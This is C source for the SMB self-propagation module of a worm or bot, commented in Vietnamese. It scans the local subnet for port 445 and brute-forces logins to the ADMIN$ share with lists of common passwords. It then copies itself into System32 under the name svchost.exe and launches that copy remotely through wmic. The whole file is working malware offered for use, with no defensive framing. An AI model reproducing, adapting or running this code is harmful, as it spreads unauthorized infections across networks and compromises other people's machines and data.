/**
 * spreader_smb.c
 * Lan truyen qua SMB: quet port 445, brute force, copy bot, psexec/WMI
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
    #include <windows.h>
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <iphlpapi.h>
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment(lib, "iphlpapi.lib")
    #pragma comment(lib, "netapi32.lib")
#else
    #include <unistd.h>
    #include <pthread.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <ifaddrs.h>
    #include <netdb.h>
#endif

#include "spreader_smb.h"

/* Danh sach mat khau SMB thu brute force */
static const char* MAT_KHAU_SMB[] = {
    "admin", "Admin", "password", "Password", "123456", "12345678",
    "qwerty", "abc123", "letmein", "welcome", "P@ssw0rd", "Admin123",
    "admin123", "password123", "1q2w3e4r", "test", "guest", "user",
    "changeme", "secret", "Passw0rd", "Pa$$w0rd", "P@$$w0rd",
    "Admin@123", "admin@123", "Password@123",
    NULL
};

/* Danh sach username SMB thu brute force */
static const char* USERNAME_SMB[] = {
    "Administrator", "admin", "Admin", "User", "guest", "test", NULL
};

#ifdef _WIN32
/* ==================== WINDOWS SMB SPREADER ==================== */

/**
 * Lay subnet local
 */
static int lay_subnet_local(char* subnet, size_t subnet_size) {
    ULONG buffer_size = 0;
    GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, NULL, &buffer_size);
    
    IP_ADAPTER_ADDRESSES* adapters = (IP_ADAPTER_ADDRESSES*)malloc(buffer_size);
    if (adapters == NULL) return -1;
    
    if (GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, adapters, &buffer_size) == NO_ERROR) {
        IP_ADAPTER_ADDRESSES* adapter = adapters;
        while (adapter != NULL) {
            IP_ADAPTER_UNICAST_ADDRESS* unicast = adapter->FirstUnicastAddress;
            while (unicast != NULL) {
                if (unicast->Address.lpSockaddr->sa_family == AF_INET) {
                    struct sockaddr_in* sin = (struct sockaddr_in*)unicast->Address.lpSockaddr;
                    char ip[16];
                    inet_ntop(AF_INET, &sin->sin_addr, ip, sizeof(ip));
                    
                    /* Chi lay IP private */
                    if (strncmp(ip, "192.168.", 8) == 0 ||
                        strncmp(ip, "10.", 3) == 0 ||
                        strncmp(ip, "172.", 4) == 0) {
                        
                        /* Tao subnet */
                        strncpy(subnet, ip, subnet_size - 1);
                        char* last_dot = strrchr(subnet, '.');
                        if (last_dot != NULL) {
                            *(last_dot + 1) = '\0';
                        }
                        
                        free(adapters);
                        return 0;
                    }
                }
                unicast = unicast->Next;
            }
            adapter = adapter->Next;
        }
    }
    
    free(adapters);
    return -1;
}

/**
 * Quet port 445 trong LAN
 */
static int quet_port_445(const char* ip_muc_tieu) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return 0;
    
    /* Dat timeout */
    int timeout = 1000; /* 1 giay */
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(445);
    inet_pton(AF_INET, ip_muc_tieu, &addr.sin_addr);
    
    int result = connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    closesocket(sock);
    
    return (result == 0) ? 1 : 0;
}

/**
 * Thu dang nhap SMB
 */
static int thu_dang_nhap_smb(const char* ip_muc_tieu, const char* username, 
                              const char* password) {
    NETRESOURCEA net_resource;
    memset(&net_resource, 0, sizeof(net_resource));
    net_resource.dwType = RESOURCETYPE_DISK;
    
    char remote_path[256];
    snprintf(remote_path, sizeof(remote_path), "\\\\%s\\ADMIN$", ip_muc_tieu);
    net_resource.lpRemoteName = remote_path;
    
    char username_domain[256];
    snprintf(username_domain, sizeof(username_domain), "%s\\%s", ip_muc_tieu, username);
    
    DWORD result = WNetAddConnection2A(&net_resource, password, username_domain, 0);
    
    if (result == NO_ERROR) {
        WNetCancelConnection2A(remote_path, 0, TRUE);
        return 1;
    }
    
    return 0;
}

/**
 * Copy bot den may muc tieu
 */
static int copy_bot_smb(const char* ip_muc_tieu, const char* username, 
                         const char* password) {
    char duong_dan_bot[1024];
    GetModuleFileNameA(NULL, duong_dan_bot, sizeof(duong_dan_bot));
    
    /* Ket noi ADMIN$ share */
    NETRESOURCEA net_resource;
    memset(&net_resource, 0, sizeof(net_resource));
    net_resource.dwType = RESOURCETYPE_DISK;
    
    char remote_path[256];
    snprintf(remote_path, sizeof(remote_path), "\\\\%s\\ADMIN$", ip_muc_tieu);
    net_resource.lpRemoteName = remote_path;
    
    char username_domain[256];
    snprintf(username_domain, sizeof(username_domain), "%s\\%s", ip_muc_tieu, username);
    
    DWORD result = WNetAddConnection2A(&net_resource, password, username_domain, 0);
    if (result != NO_ERROR) {
        return -1;
    }
    
    /* Copy file */
    char dest_path[512];
    snprintf(dest_path, sizeof(dest_path), "\\\\%s\\ADMIN$\\System32\\svchost.exe", ip_muc_tieu);
    
    if (CopyFileA(duong_dan_bot, dest_path, FALSE)) {
        /* Chay bot qua WMI */
        char cmd[1024];
        snprintf(cmd, sizeof(cmd), 
                 "wmic /node:\"%s\" /user:\"%s\" /password:\"%s\" "
                 "process call create \"cmd.exe /c %s\"",
                 ip_muc_tieu, username, password, dest_path);
        
        system(cmd);
    }
    
    WNetCancelConnection2A(remote_path, 0, TRUE);
    return 0;
}

/**
 * Quet LAN va spread
 */
int quet_va_spread_smb(void) {
    char subnet[32];
    if (lay_subnet_local(subnet, sizeof(subnet)) != 0) {
        return -1;
    }
    
    printf("[SMB] Quet subnet: %s0/24\n", subnet);
    
    int so_may_thanh_cong = 0;
    
    /* Quet 254 dia chi IP */
    for (int i = 1; i <= 254 && so_may_thanh_cong < 10; i++) {
        char ip_muc_tieu[16];
        snprintf(ip_muc_tieu, sizeof(ip_muc_tieu), "%s%d", subnet, i);
        
        /* Quet port 445 */
        if (!quet_port_445(ip_muc_tieu)) continue;
        
        printf("[SMB] Tim thay SMB: %s\n", ip_muc_tieu);
        
        /* Brute force */
        int da_dang_nhap = 0;
        for (int u = 0; USERNAME_SMB[u] != NULL && !da_dang_nhap; u++) {
            for (int p = 0; MAT_KHAU_SMB[p] != NULL && !da_dang_nhap; p++) {
                if (thu_dang_nhap_smb(ip_muc_tieu, USERNAME_SMB[u], MAT_KHAU_SMB[p])) {
                    printf("[SMB] Dang nhap thanh cong: %s / %s\n", 
                           USERNAME_SMB[u], MAT_KHAU_SMB[p]);
                    
                    /* Copy va chay bot */
                    copy_bot_smb(ip_muc_tieu, USERNAME_SMB[u], MAT_KHAU_SMB[p]);
                    so_may_thanh_cong++;
                    da_dang_nhap = 1;
                }
            }
        }
    }
    
    return so_may_thanh_cong;
}

#else
/* ==================== LINUX SMB SPREADER ==================== */

int quet_va_spread_smb(void) {
    printf("[SMB] Chua ho tro tren Linux\n");
    return 0;
}

#endif